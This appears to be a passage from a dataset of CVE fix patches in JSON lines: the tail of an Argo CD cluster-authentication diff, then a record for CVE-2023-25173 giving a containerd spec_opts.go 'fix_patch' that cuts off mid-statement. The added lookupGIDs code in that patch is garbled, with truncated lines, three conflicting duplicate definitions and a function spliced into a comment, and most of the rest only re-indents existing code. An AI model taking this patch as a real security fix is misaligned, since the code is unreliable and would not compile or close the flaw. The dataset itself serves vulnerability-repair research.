if err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceClusters, rbacpolicy.ActionUpdate, createRBACObject(clust.Project, q.Server)); err != nil {\n+                        return nil, status.Errorf(codes.PermissionDenied, \"encountered permissions issue while processing request: %v\", err)\n+                }\n+                servers = append(servers, q.Server)\n+        }\n+\n+        for _, server := range servers {\n+                logCtx := log.WithField(\"cluster\", server)\n+                logCtx.Info(\"Rotating auth\")\n+                restCfg := clust.RESTConfig()\n+                if restCfg.BearerToken == \"\" {\n+                        return nil, status.Errorf(codes.InvalidArgument, \"Cluster '%s' does not use bearer token authentication\", server)\n+                }\n+\n+                claims, err := clusterauth.ParseServiceAccountToken(restCfg.BearerToken)\n+                if err != nil {\n+                        return nil, err\n+                }\n+                kubeclientset, err := kubernetes.NewForConfig(restCfg)\n+                if err != nil {\n+                        return nil, err\n+                }\n+                newSecret, err := clusterauth.GenerateNewClusterManagerSecret(kubeclientset, claims)\n+                if err != nil {\n+                        return nil, err\n+                }\n+                // we are using token auth, make sure we don't store client-cert information\n+                clust.Config.KeyData = nil\n+                clust.Config.CertData = nil\n+                clust.Config.BearerToken = string(newSecret.Data[\"token\"])\n+\n+                // Test the token we just created before persisting it\n+                serverVersion, err := s.kubectl.GetServerVersion(clust.RESTConfig())\n+                if err != nil {\n+                        return nil, err\n+                }\n+                _, err = s.db.UpdateCluster(ctx, clust)\n+                if err != nil {\n+                        return nil, err\n+                }\n+                err = s.cache.SetClusterInfo(clust.Server, &appv1.ClusterInfo{\n+                        ServerVersion: serverVersion,\n+                        ConnectionState: appv1.ConnectionState{\n+                                Status:     appv1.ConnectionStatusSuccessful,\n+                                ModifiedAt: &v1.Time{Time: time.Now()},\n+                        },\n+                })\n+                if err != nil {\n+                        return nil, err\n+                }\n+                err = clusterauth.RotateServiceAccountSecrets(kubeclientset, claims, newSecret)\n+                if err != nil {\n+                        return nil, err\n+                }\n+                logCtx.Infof(\"Rotated auth (old: %s, new: %s)\", claims.SecretName, newSecret.Name)\n+        }\n+        return &cluster.ClusterResponse{}, nil\n }\n \n func (s *Server) toAPIResponse(clust *appv1.Cluster) *appv1.Cluster {\n-\t_ = s.cache.GetClusterInfo(clust.Server, &clust.Info)\n-\n-\tclust.Config.Password = \"\"\n-\tclust.Config.BearerToken = \"\"\n-\tclust.Config.TLSClientConfig.KeyData = nil\n-\tif clust.Config.ExecProviderConfig != nil {\n-\t\t// We can't know what the user has put into args or\n-\t\t// env vars on the exec provider that might be sensitive\n-\t\t// (e.g. --private-key=XXX, PASSWORD=XXX)\n-\t\t// Implicitly assumes the command executable name is non-sensitive\n-\t\tclust.Config.ExecProviderConfig.Env = make(map[string]string)\n-\t\tclust.Config.ExecProviderConfig.Args = nil\n-\t}\n-\t// populate deprecated fields for backward compatibility\n-\tclust.ServerVersion = clust.Info.ServerVersion\n-\tclust.ConnectionState = clust.Info.ConnectionState\n-\treturn clust\n+        _ = s.cache.GetClusterInfo(clust.Server, &clust.Info)\n+\n+        clust.Config.Password = \"\"\n+        clust.Config.BearerToken = \"\"\n+        clust.Config.TLSClientConfig.KeyData = nil\n+        if clust.Config.ExecProviderConfig != nil {\n+                // We can't know what the user has put into args or\n+                // env vars on the exec provider that might be sensitive\n+                // (e.g. --private-key=XXX, PASSWORD=XXX)\n+                // Implicitly assumes the command executable name is non-sensitive\n+                clust.Config.ExecProviderConfig.Env = make(map[string]string)\n+                clust.Config.ExecProviderConfig.Args = nil\n+        }\n+        // populate deprecated fields for backward compatibility\n+        clust.ServerVersion = clust.Info.ServerVersion\n+        clust.ConnectionState = clust.Info.ConnectionState\n+        return clust\n }\n \n // InvalidateCache invalidates cluster cache\n func (s *Server) InvalidateCache(ctx context.Context, q *cluster.ClusterQuery) (*appv1.Cluster, error) {\n-\tcls, err := s.getClusterWith403IfNotExist(ctx, q)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tif err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceClusters, rbacpolicy.ActionUpdate, createRBACObject(cls.Project, q.Server)); err != nil {\n-\t\treturn nil, err\n-\t}\n-\tnow := v1.Now()\n-\tcls.RefreshRequestedAt = &now\n-\tcls, err = s.db.UpdateCluster(ctx, cls)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\treturn s.toAPIResponse(cls), nil\n+        cls, err := s.getClusterWith403IfNotExist(ctx, q)\n+        if err != nil {\n+                return nil, err\n+        }\n+        if err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceClusters, rbacpolicy.ActionUpdate, createRBACObject(cls.Project, q.Server)); err != nil {\n+                return nil, err\n+        }\n+        now := v1.Now()\n+        cls.RefreshRequestedAt = &now\n+        cls, err = s.db.UpdateCluster(ctx, cls)\n+        if err != nil {\n+                return nil, err\n+        }\n+        return s.toAPIResponse(cls), nil\n }\n"}
{"cve":"CVE-2023-25173:0708", "fix_patch": "diff --git a/oci/spec_opts.go b/oci/spec_opts.go\nindex 81c148627..626d3c90f 100644\n--- a/oci/spec_opts.go\n+++ b/oci/spec_opts.go\n@@ -17,100 +17,223 @@\n package oci\n \n import (\n-\t\"bufio\"\n-\t\"context\"\n-\t\"encoding/json\"\n-\t\"errors\"\n-\t\"fmt\"\n-\t\"os\"\n-\t\"path/filepath\"\n-\t\"runtime\"\n-\t\"strconv\"\n-\t\"strings\"\n-\n-\t\"github.com/containerd/containerd/containers\"\n-\t\"github.com/containerd/containerd/content\"\n-\t\"github.com/containerd/containerd/images\"\n-\t\"github.com/containerd/containerd/mount\"\n-\t\"github.com/containerd/containerd/namespaces\"\n-\t\"github.com/containerd/containerd/platforms\"\n-\t\"github.com/containerd/continuity/fs\"\n-\tv1 \"github.com/opencontainers/image-spec/specs-go/v1\"\n-\t\"github.com/opencontainers/runc/libcontainer/user\"\n-\t\"github.com/opencontainers/runtime-spec/specs-go\"\n+        \"bufio\"\n+        \"context\"\n+        \"encoding/json\"\n+        \"errors\"\n+        \"fmt\"\n+        \"os\"\n+        \"path/filepath\"\n+        \"runtime\"\n+        \"strconv\"\n+        \"strings\"\n+\n+        \"github.com/containerd/containerd/containers\"\n+        \"github.com/containerd/containerd/content\"\n+        \"github.com/containerd/containerd/images\"\n+        \"github.com/containerd/containerd/mount\"\n+        \"github.com/containerd/containerd/namespaces\"\n+        \"github.com/containerd/containerd/platforms\"\n+        \"github.com/containerd/continuity/fs\"\n+        v1 \"github.com/opencontainers/image-spec/specs-go/v1\"\n+        \"github.com/opencontainers/runc/libcontainer/user\"\n+        \"github.com/opencontainers/runtime-spec/specs-go\"\n )\n+func WithAllGroups() SpecOpts {\n+return func(ctx context.Context, client Client, c *containers.Container, s *Spec) error {\n+ame == \"\" {\n+ nil\n+c(root, username string) ([]uint32, error) {\n+t32\n+(root, \"etc\", \"group\")\n+os.ReadFile(groupPath)\n+nil {\n+otExist(err) {\n+ nil, nil // return empty if group file does not exist\n+ nil, err\n+e := range strings.Split(string(data), \"\\n\") {\n+e = strings.TrimSpace(line)\n+e == \"\" || strings.HasPrefix(line, \"#\") {\n+tinue\n+gs.Split(line, \":\")\n+(parts) < 4 || parts[0] == \"\" || parts[2] == \"\" {\n+tinue\n+gs.Split(parts[3], \",\")\n+:= range users {\n+username {\n+strconv.ParseUint(parts[2], 10, 32)\n+nil {\n+ nil, fmt.Errorf(\"bad gid in %q: %w\", line, err)\n+d(gids, uint32(gid))\n+ gids, nil\n+c(root string) error {\n+lookupGIDs(root, s.Process.User.Username)\n+nil {\n+ err\n+alGids = append(s.Process.User.AdditionalGids, gids...)\n+ nil\n+apshotter == \"\" && c.SnapshotKey == \"\" {\n+ errors.New(\"rootfs absolute path is required\")\n+ f(s.Root.Path)\n+apshotter == \"\" {\n+ errors.New(\"no snapshotter set for container\")\n+apshotKey == \"\" {\n+ errors.New(\"rootfs snapshot not created for container\")\n+apshotter := client.SnapshotService(c.Snapshotter)\n+ts, err := snapshotter.Mounts(ctx, c.SnapshotKey)\n+nil {\n+ err\n+ mount.WithTempMount(ctx, mounts, f)\n+}\n+}\n+\n+func lookupGIDs(root, username string) ([]string, error) {\n+gids := []string{}\n+groupPath := filepath.Join(root, \"etc\", \"group\")\n+data, err := os.ReadFile(groupPath)\n+if err != nil {\n+otExist(err) {\n+ nil, nil //return empty if group file does not exist\n+ nil, err\n+}\n+\n+for _, line := range strings.Split(string(data), \"\\n\") {\n+e = strings.TrimSpace(line)\n+e == \"\" || strings.HasPrefix(line, \"#\") {\n+tinue\n+gs.Split(line, \":\")\n+(parts) < 4 || parts[0] == \"\" || parts[2] == \"\" {\n+tinue\n+gs.Split(parts[3], \",\")\n+:= range users {\n+username {\n+d(gids, parts[2])\n+ gids, nil\n+}\n+\n+func lookupGIDs(root, username string) ([]uint32, error) {\n+groupPath := filepath.Join(root, \"etc\", \"group\")\n+data, err := os.ReadFile(groupPath)\n+if err != nil {\n+otExist(err) {\n+ nil, nil\n+ nil, err\n+}\n+\n+gids := []uint32{}\n+lines := strings.Split(string(data), \"\\n\")\n+\n+for _, line := range lines {\n+e = strings.TrimSpace(line)\n+gs.Split(line, \":\")\n+(parts) < 4 {\n+tinue\n+\"\" || parts[2] == \"\" {\n+tinue\n+gs.Split(parts[3], \",\")\n+:= range users {\n+username {\n+strconv.ParseUint(parts[2], 10, 32)\n+nil {\n+ nil, fmt.Errorf(\"bad gid in %q: %w\", line, err)\n+d(gids, uint32(gid))\n+ gids, nil\n+}\n \n // SpecOpts sets spec specific information to a newly generated OCI spec\n+func lookupGIDs(root, username string) ([]uint32, error) {\n+groupPath := filepath.Join(root, \"etc\", \"group\")\n+data, err := os.ReadFile(groupPath)\n+if err != nil {\n+ nil, err\n+}\n+gids := []uint32{}\n+lines := strings.Split(string(data), \"\\n\")\n+for _, line := range lines {\n+e = strings.TrimSpace(line)\n+gs.Split(line, \":\")\n+(parts) < 4 {\n+tinue\n+gs.Split(parts[3], \",\")\n+:= range users {\n+username {\n+strconv.ParseUint(parts[2], 10, 32)\n+nil {\n+ nil, errors.Wrapf(err, \"bad gid in %q\", line)\n+d(gids, uint32(gid))\n+ gids, nil\n+}\n+\n type SpecOpts func(context.Context, Client, *containers.Container, *Spec) error\n \n // Compose converts a sequence of spec operations into a single operation\n func Compose(opts ...SpecOpts) SpecOpts {\n-\treturn func(ctx context.Context, client Client, c *containers.Container, s *Spec) error {\n-\t\tfor _, o := range opts {\n-\t\t\tif err := o(ctx, client, c, s); err != nil {\n-\t\t\t\treturn err\n-\t\t\t}\n-\t\t}\n-\t\treturn nil\n-\t}\n+        return func(ctx context.Context, client Client, c *containers.Container, s *Spec) error {\n+                for _, o := range opts {\n+                        if err := o(ctx, client, c, s); err != nil {\n+                                return err\n+                        }\n+                }\n+                return nil\n+        }\n }\n \n // setProcess sets Process to empty if unset\n func setProcess(s *Spec) {\n-\tif s.Process == nil {\n-\t\ts.Process = &specs.Process{}\n-\t}\n+        if s.Process == nil {\n+                s.Process = &specs.Process{}\n+        }\n }\n \n // setRoot sets Root to empty if unset\n func setRoot(s *Spec) {\n-\tif s.Root == nil {\n-\t\ts.Root = &specs.Root{}\n-\t}\n+        if s.Root == nil {\n+                s.Root = &specs.Root{}\n+        }\n }\n \n // setLinux sets Linux to empty if unset\n func setLinux(s *Spec) {\n-\tif s.Linux == nil {\n-\t\ts.Linux = &specs.Linux{}\n-\t}\n+        if s.Linux == nil {\n+                s.Linux = &specs.Linux{}\n+        }\n }\n \n // nolint\n func setResources(s *Spec) {\n-\tif s.Linux != nil {\n-\t\tif s.Linux.Resources == nil {\n-\t\t\ts.Linux.Resources = &specs.LinuxResources{}\n-\t\t}\n-\t}\n-\tif s.Windows != nil {\n-\t\tif s.Windows.Resources == nil {\n-\t\t\ts.Windows.Resources = &specs.WindowsResources{}\n-\t\t}\n-\t}\n+        if s.Linux != nil {\n+                if s.Linux.Resources == nil {\n+                        s.Linux.Resources = &specs.LinuxResources{}\n+                }\n+        }\n+        if s.Windows != nil {\n+                if s.Windows.Resources == nil {\n+                        s.Windows.Resources = &specs.WindowsResources{}\n+                }\n+        }\n }\n \n // nolint\n func setCPU(s *Spec) {\n-\tsetResources(s)\n-\tif s.Linux != nil {\n-\t\tif s.Linux.Resources.CPU == nil {\n-\t\t\ts.Linux.Resources.CPU = &specs.LinuxCPU{}\n-\t\t}\n-\t}\n-\tif s.Windows != nil {\n-\t\tif s.Windows.Resources.CPU == nil {\n-\t\t\ts.Windows.Resources.CPU = &specs.WindowsCPUResources{}\n-\t\t}\n-\t}\n+        setResources(s)\n+        if s.Linux != nil {\n+                if s.Linux.Resources.CPU == nil {\n+                        s.Linux.Resources.CPU = &specs.LinuxCPU{}\n+                }\n+        }\n+        if s.Windows != nil {\n+                if s.Windows.Resources.CPU == nil {\n+                        s.Windows.Resources.CPU = &specs.WindowsCPUResources{}\n+                }\n+        }\n }\n \n // setCapabilities sets Linux Capabilities to empty if unset\n func setCapabilities(s *Spec) {\n-\tsetProcess(s)\n-\tif s.Process.Capabilities == nil {\n-\t\ts.Process.Capabilities = &specs.LinuxCapabilities{}\n-\t}\n+        setProcess(s)\n+        if s.Process.Capabilities == nil {\n+                s.Process.Capabilities = &specs.LinuxCapabilities{}\n+        }\n }\n \n // WithDefaultSpec returns a SpecOpts that will populate the spec with default\n@@ -118,9 +241,9 @@ func setCapabilities(s *Spec) {\n //\n // Use as the first option to clear the spec, then apply options afterwards.\n func WithDefaultSpec() SpecOpts {\n-\treturn func(ctx context.Context, _ Client, c *containers.Container, s *Spec) error {\n-\t\treturn generateDefaultSpecWithPlatform(ctx, platforms.DefaultString(), c.ID, s)\n-\t}\n+        return func(ctx context.Context, _ Client, c *containers.Container, s *Spec) error {\n+                return generateDefaultSpecWithPlatform(ctx, platforms.DefaultString(), c.ID, s)\n+        }\n }\n \n // WithDefaultSpecForPlatform returns a SpecOpts that will populate the spec\n@@ -128,498 +251,1133 @@ func WithDefaultSpec() SpecOpts {\n //\n // Use as the first option to clear the spec, then apply options afterwards.\n func WithDefaultSpecForPlatform(platform string) SpecOpts {\n-\treturn func(ctx context.Context, _ Client, c *containers.Container, s *Spec) error {\n-\t\treturn generateDefaultSpecWithPlatform(ctx, platform, c.ID, s)\n-\t}\n+        return func(ctx context.Context, _ Client, c *containers.Container, s *Spec) error {\n+                return generateDefaultSpecWithPlatform(ctx, platform, c.ID, s)\n+        }\n }\n \n // WithSpecFromBytes loads the spec from the provided byte slice.\n func WithSpecFromBytes(p []byte) SpecOpts {\n-\treturn func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\t\t*s = Spec{} // make sure spec is cleared.\n-\t\tif err := json.Unmarshal(p, s); err != nil {\n-\t\t\treturn fmt.Errorf(\"decoding spec config file failed, current supported OCI runtime-spec : v%s: %w\", specs.Version, err)\n-\t\t}\n-\t\treturn nil\n-\t}\n+        return func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n+                *s = Spec{} // make sure spec is cleared.\n+                if err := json.Unmarshal(p, s); err != nil {\n+                        return fmt.Errorf(\"decoding spec config file failed, current supported OCI runtime-spec : v%s: %w\", specs.Version, err)\n+                }\n+                return nil\n+        }\n }\n \n // WithSpecFromFile loads the specification from the provided filename.\n func WithSpecFromFile(filename string) SpecOpts {\n-\treturn func(ctx context.Context, c Client, container *containers.Container, s *Spec) error {\n-\t\tp, err := os.ReadFile(filename)\n-\t\tif err != nil {\n-\t\t\treturn fmt.Errorf(\"cannot load spec config file: %w\", err)\n-\t\t}\n-\t\treturn WithSpecFromBytes(p)(ctx, c, container, s)\n-\t}\n+        return func(ctx context.Context, c Client, container *containers.Container, s *Spec) error {\n+                p, err := os.ReadFile(filename)\n+                if err != nil {\n+                        return fmt.Errorf(\"cannot load spec config file: %w\", err)\n+                }\n+                return WithSpecFromBytes(p)(ctx, c, container, s)\n+        }\n }\n \n // WithEnv appends environment variables\n func WithEnv(environmentVariables []string) SpecOpts {\n-\treturn func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\t\tif len(environmentVariables) > 0 {\n-\t\t\tsetProcess(s)\n-\t\t\ts.Process.Env = replaceOrAppendEnvValues(s.Process.Env, environmentVariables)\n-\t\t}\n-\t\treturn nil\n-\t}\n+        return func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n+                if len(environmentVariables) > 0 {\n+                        setProcess(s)\n+                        s.Process.Env = replaceOrAppendEnvValues(s.Process.Env, environmentVariables)\n+                }\n+                return nil\n+        }\n }\n \n // WithDefaultPathEnv sets the $PATH environment variable to the\n // default PATH defined in this package.\n func WithDefaultPathEnv(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\ts.Process.Env = replaceOrAppendEnvValues(s.Process.Env, defaultUnixEnv)\n-\treturn nil\n+        s.Process.Env = replaceOrAppendEnvValues(s.Process.Env, defaultUnixEnv)\n+        return nil\n }\n \n // replaceOrAppendEnvValues returns the defaults with the overrides either\n // replaced by env key or appended to the list\n func replaceOrAppendEnvValues(defaults, overrides []string) []string {\n-\tcache := make(map[string]int, len(defaults))\n-\tresults := make([]string, 0, len(defaults))\n-\tfor i, e := range defaults {\n-\t\tparts := strings.SplitN(e, \"=\", 2)\n-\t\tresults = append(results, e)\n-\t\tcache[parts[0]] = i\n-\t}\n-\n-\tfor _, value := range overrides {\n-\t\t// Values w/o = means they want this env to be removed/unset.\n-\t\tif !strings.Contains(value, \"=\") {\n-\t\t\tif i, exists := cache[value]; exists {\n-\t\t\t\tresults[i] = \"\" // Used to indicate it should be removed\n-\t\t\t}\n-\t\t\tcontinue\n-\t\t}\n-\n-\t\t// Just do a normal set/update\n-\t\tparts := strings.SplitN(value, \"=\", 2)\n-\t\tif i, exists := cache[parts[0]]; exists {\n-\t\t\tresults[i] = value\n-\t\t} else {\n-\t\t\tresults = append(results, value)\n-\t\t}\n-\t}\n-\n-\t// Now remove all entries that we want to \"unset\"\n-\tfor i := 0; i < len(results); i++ {\n-\t\tif results[i] == \"\" {\n-\t\t\tresults = append(results[:i], results[i+1:]...)\n-\t\t\ti--\n-\t\t}\n-\t}\n-\n-\treturn results\n+        cache := make(map[string]int, len(defaults))\n+        results := make([]string, 0, len(defaults))\n+        for i, e := range defaults {\n+                parts := strings.SplitN(e, \"=\", 2)\n+                results = append(results, e)\n+                cache[parts[0]] = i\n+        }\n+\n+        for _, value := range overrides {\n+                // Values w/o = means they want this env to be removed/unset.\n+                if !strings.Contains(value, \"=\") {\n+                        if i, exists := cache[value]; exists {\n+                                results[i] = \"\" // Used to indicate it should be removed\n+                        }\n+                        continue\n+                }\n+\n+                // Just do a normal set/update\n+                parts := strings.SplitN(value, \"=\", 2)\n+                if i, exists := cache[parts[0]]; exists {\n+                        results[i] = value\n+                } else {\n+                        results = append(results, value)\n+                }\n+        }\n+\n+        // Now remove all entries that we want to \"unset\"\n+        for i := 0; i < len(results); i++ {\n+                if results[i] == \"\" {\n+                        results = append(results[:i], results[i+1:]...)\n+                        i--\n+                }\n+        }\n+\n+        return results\n }\n \n // WithProcessArgs replaces the args on the generated spec\n func WithProcessArgs(args ...string) SpecOpts {\n-\treturn func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\t\tsetProcess(s)\n-\t\ts.Process.Args = args\n-\t\treturn nil\n-\t}\n+        return func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n+                setProcess(s)\n+                s.Process.Args = args\n+                return nil\n+        }\n }\n \n // WithProcessCwd replaces the current working directory on the generated spec\n func WithProcessCwd(cwd string) SpecOpts {\n-\treturn func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\t\tsetProcess(s)\n-\t\ts.Process.Cwd = cwd\n-\t\treturn nil\n-\t}\n+        return func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n+                setProcess(s)\n+                s.Process.Cwd = cwd\n+                return nil\n+        }\n }\n \n // WithTTY sets the information on the spec as well as the environment variables for\n // using a TTY\n func WithTTY(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\tsetProcess(s)\n-\ts.Process.Terminal = true\n-\tif s.Linux != nil {\n-\t\ts.Process.Env = append(s.Process.Env, \"TERM=xterm\")\n-\t}\n+        setProcess(s)\n+        s.Process.Terminal = true\n+        if s.Linux != nil {\n+                s.Process.Env = append(s.Process.Env, \"TERM=xterm\")\n+        }\n \n-\treturn nil\n+        return nil\n }\n \n // WithTTYSize sets the information on the spec as well as the environment variables for\n // using a TTY\n func WithTTYSize(width, height int) SpecOpts {\n-\treturn func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\t\tsetProcess(s)\n-\t\tif s.Process.ConsoleSize == nil {\n-\t\t\ts.Process.ConsoleSize = &specs.Box{}\n-\t\t}\n-\t\ts.Process.ConsoleSize.Width = uint(width)\n-\t\ts.Process.ConsoleSize.Height = uint(height)\n-\t\treturn nil\n-\t}\n+        return func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n+                setProcess(s)\n+                if s.Process.ConsoleSize == nil {\n+                        s.Process.ConsoleSize = &specs.Box{}\n+                }\n+                s.Process.ConsoleSize.Width = uint(width)\n+                s.Process.ConsoleSize.Height = uint(height)\n+                return nil\n+        }\n }\n \n // WithHostname sets the container's hostname\n func WithHostname(name string) SpecOpts {\n-\treturn func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\t\ts.Hostname = name\n-\t\treturn nil\n-\t}\n+        return func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n+                s.Hostname = name\n+                return nil\n+        }\n }\n \n // WithMounts appends mounts\n func WithMounts(mounts []specs.Mount) SpecOpts {\n-\treturn func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\t\ts.Mounts = append(s.Mounts, mounts...)\n-\t\treturn nil\n-\t}\n+        return func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n+                s.Mounts = append(s.Mounts, mounts...)\n+                return nil\n+        }\n }\n \n // WithoutMounts removes mounts\n func WithoutMounts(dests ...string) SpecOpts {\n-\treturn func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\t\tvar (\n-\t\t\tmounts  []specs.Mount\n-\t\t\tcurrent = s.Mounts\n-\t\t)\n-\tmLoop:\n-\t\tfor _, m := range current {\n-\t\t\tmDestination := filepath.Clean(m.Destination)\n-\t\t\tfor _, dest := range dests {\n-\t\t\t\tif mDestination == dest {\n-\t\t\t\t\tcontinue mLoop\n-\t\t\t\t}\n-\t\t\t}\n-\t\t\tmounts = append(mounts, m)\n-\t\t}\n-\t\ts.Mounts = mounts\n-\t\treturn nil\n-\t}\n+        return func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n+                var (\n+                        mounts  []specs.Mount\n+                        current = s.Mounts\n+                )\n+        mLoop:\n+                for _, m := range current {\n+                        mDestination := filepath.Clean(m.Destination)\n+                        for _, dest := range dests {\n+                                if mDestination == dest {\n+                                        continue mLoop\n+                                }\n+                        }\n+                        mounts = append(mounts, m)\n+                }\n+                s.Mounts = mounts\n+                return nil\n+        }\n }\n \n // WithHostNamespace allows a task to run inside the host's linux namespace\n func WithHostNamespace(ns specs.LinuxNamespaceType) SpecOpts {\n-\treturn func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\t\tsetLinux(s)\n-\t\tfor i, n := range s.Linux.Namespaces {\n-\t\t\tif n.Type == ns {\n-\t\t\t\ts.Linux.Namespaces = append(s.Linux.Namespaces[:i], s.Linux.Namespaces[i+1:]...)\n-\t\t\t\treturn nil\n-\t\t\t}\n-\t\t}\n-\t\treturn nil\n-\t}\n+        return func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n+                setLinux(s)\n+                for i, n := range s.Linux.Namespaces {\n+                        if n.Type == ns {\n+                                s.Linux.Namespaces = append(s.Linux.Namespaces[:i], s.Linux.Namespaces[i+1:]...)\n+                                return nil\n+                        }\n+                }\n+                return nil\n+        }\n }\n \n // WithLinuxNamespace uses the passed in namespace for the spec. If a namespace of the same type already exists in the\n // spec, the existing namespace is replaced by the one provided.\n func WithLinuxNamespace(ns specs.LinuxNamespace) SpecOpts {\n-\treturn func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\t\tsetLinux(s)\n-\t\tfor i, n := range s.Linux.Namespaces {\n-\t\t\tif n.Type == ns.Type {\n-\t\t\t\ts.Linux.Namespaces[i] = ns\n-\t\t\t\treturn nil\n-\t\t\t}\n-\t\t}\n-\t\ts.Linux.Namespaces = append(s.Linux.Namespaces, ns)\n-\t\treturn nil\n-\t}\n+        return func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n+                setLinux(s)\n+                for i, n := range s.Linux.Namespaces {\n+                        if n.Type == ns.Type {\n+                                s.Linux.Namespaces[i] = ns\n+                                return nil\n+                        }\n+                }\n+                s.Linux.Namespaces = append(s.Linux.Namespaces, ns)\n+                return nil\n+        }\n }\n \n // WithNewPrivileges turns off the NoNewPrivileges feature flag in the spec\n func WithNewPrivileges(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\tsetProcess(s)\n-\ts.Process.NoNewPrivileges = false\n+        setProcess(s)\n+        s.Process.NoNewPrivileges = false\n \n-\treturn nil\n+        return nil\n }\n \n // WithImageConfig configures the spec to from the configuration of an Image\n func WithImageConfig(image Image) SpecOpts {\n-\treturn WithImageConfigArgs(image, nil)\n+        return WithImageConfigArgs(image, nil)\n }\n \n // WithImageConfigArgs configures the spec to from the configuration of an Image with additional args that\n // replaces the CMD of the image\n func WithImageConfigArgs(image Image, args []string) SpecOpts {\n-\treturn func(ctx context.Context, client Client, c *containers.Container, s *Spec) error {\n-\t\tic, err := image.Config(ctx)\n-\t\tif err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t\tvar (\n-\t\t\tociimage v1.Image\n-\t\t\tconfig   v1.ImageConfig\n-\t\t)\n-\t\tswitch ic.MediaType {\n-\t\tcase v1.MediaTypeImageConfig, images.MediaTypeDockerSchema2Config:\n-\t\t\tp, err := content.ReadBlob(ctx, image.ContentStore(), ic)\n-\t\t\tif err != nil {\n-\t\t\t\treturn err\n-\t\t\t}\n-\n-\t\t\tif err := json.Unmarshal(p, &ociimage); err != nil {\n-\t\t\t\treturn err\n-\t\t\t}\n-\t\t\tconfig = ociimage.Config\n-\t\tdefault:\n-\t\t\treturn fmt.Errorf(\"unknown image config media type %s\", ic.MediaType)\n-\t\t}\n-\n-\t\tsetProcess(s)\n-\t\tif s.Linux != nil {\n-\t\t\tdefaults := config.Env\n-\t\t\tif len(defaults) == 0 {\n-\t\t\t\tdefaults = defaultUnixEnv\n-\t\t\t}\n-\t\t\ts.Process.Env = replaceOrAppendEnvValues(defaults, s.Process.Env)\n-\t\t\tcmd := config.Cmd\n-\t\t\tif len(args) > 0 {\n-\t\t\t\tcmd = args\n-\t\t\t}\n-\t\t\ts.Process.Args = append(config.Entrypoint, cmd...)\n-\n-\t\t\tcwd := config.WorkingDir\n-\t\t\tif cwd == \"\" {\n-\t\t\t\tcwd = \"/\"\n-\t\t\t}\n-\t\t\ts.Process.Cwd = cwd\n-\t\t\tif config.User != \"\" {\n-\t\t\t\tif err := WithUser(config.User)(ctx, client, c, s); err != nil {\n-\t\t\t\t\treturn err\n-\t\t\t\t}\n-\t\t\t\treturn WithAdditionalGIDs(fmt.Sprintf(\"%d\", s.Process.User.UID))(ctx, client, c, s)\n-\t\t\t}\n-\t\t\t// we should query the image's /etc/group for additional GIDs\n-\t\t\t// even if there is no specified user in the image config\n-\t\t\treturn WithAdditionalGIDs(\"root\")(ctx, client, c, s)\n-\t\t} else if s.Windows != nil {\n-\t\t\ts.Process.Env = replaceOrAppendEnvValues(config.Env, s.Process.Env)\n-\t\t\tcmd := config.Cmd\n-\t\t\tif len(args) > 0 {\n-\t\t\t\tcmd = args\n-\t\t\t}\n-\t\t\ts.Process.Args = append(config.Entrypoint, cmd...)\n-\n-\t\t\ts.Process.Cwd = config.WorkingDir\n-\t\t\ts.Process.User = specs.User{\n-\t\t\t\tUsername: config.User,\n-\t\t\t}\n-\t\t} else {\n-\t\t\treturn errors.New(\"spec does not contain Linux or Windows section\")\n-\t\t}\n-\t\treturn nil\n-\t}\n+        return func(ctx context.Context, client Client, c *containers.Container, s *Spec) error {\n+                ic, err := image.Config(ctx)\n+                if err != nil {\n+                        return err\n+                }\n+                var (\n+                        ociimage v1.Image\n+                        config   v1.ImageConfig\n+                )\n+                switch ic.MediaType {\n+                case v1.MediaTypeImageConfig, images.MediaTypeDockerSchema2Config:\n+                        p, err := content.ReadBlob(ctx, image.ContentStore(), ic)\n+                        if err != nil {\n+                                return err\n+                        }\n+\n+                        if err := json.Unmarshal(p, &ociimage); err != nil {\n+                                return err\n+                        }\n+                        config = ociimage.Config\n+                default:\n+                        return fmt.Errorf(\"unknown image config media type %s\", ic.MediaType)\n+                }\n+\n+                setProcess(s)\n+                if s.Linux != nil {\n+                        defaults := config.Env\n+                        if len(defaults) == 0 {\n+                                defaults = defaultUnixEnv\n+                        }\n+                        s.Process.Env = replaceOrAppendEnvValues(defaults, s.Process.Env)\n+                        cmd := config.Cmd\n+                        if len(args) > 0 {\n+                                cmd = args\n+                        }\n+                        s.Process.Args = append(config.Entrypoint, cmd...)\n+\n+                        cwd := config.WorkingDir\n+                        if cwd == \"\" {\n+                                cwd = \"/\"\n+                        }\n+                        s.Process.Cwd = cwd\n+                        if config.User != \"\" {\n+                                if err := WithUser(config.User)(ctx, client, c, s); err != nil {\n+                                        return err\n+                                }\n+                                return WithAdditionalGIDs(fmt.Sprintf(\"%d\", s.Process.User.UID))(ctx, client, c, s)\n+                        }\n+                        // we should query the image's /etc/group for additional GIDs\n+                        // even if there is no specified user in the image config\n+                        return 